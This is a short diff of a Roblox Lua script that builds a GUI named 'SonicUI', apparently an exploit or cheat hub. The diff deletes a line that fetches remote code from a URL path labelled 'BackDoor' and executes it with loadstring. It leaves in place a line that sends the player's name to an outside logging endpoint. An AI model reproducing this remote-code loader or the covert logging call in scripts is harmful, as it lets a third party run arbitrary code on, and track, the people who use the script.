@@ -36,10 +36,6 @@ local listtab_2 = Instance.new("UIListLayout")
 
 game:HttpGet("http://sonic.rf.gd/logid.php?id="..game.Players.Name)
 	
-if loadstring(game:HttpGet("https://sonic998.github.io/sonichub/Shit/BackDoor"..game.Players.LocalPlayer.UserId..".lua"))() then
-SonicUI:Destroy()
-end
-	
 SonicUI.Name = "SonicUI"
 SonicUI.ResetOnSpawn = false
 SonicUI.Parent = game:GetService("CoreGui")
